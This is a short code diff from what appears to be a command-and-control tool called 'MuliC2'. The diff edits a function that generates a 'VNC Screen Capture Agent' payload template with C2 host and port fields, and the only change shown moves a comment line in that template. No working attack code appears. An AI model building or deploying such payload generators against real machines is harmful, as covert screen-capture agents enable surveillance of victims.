@@ -1025,7 +1025,8 @@ const generateVncPayload = async () => {
     
     console.log('VNC Configuration:', { c2Host, c2Port })
     
-    let payload = `# MuliC2 VNC Screen Capture Agent
+    let payload = `
+    # MuliC2 VNC Screen Capture Agent
 # C2 Host: ${c2Host}
 # C2 Port: ${c2Port}
 # Type: ${vncForm.value.payloadType}
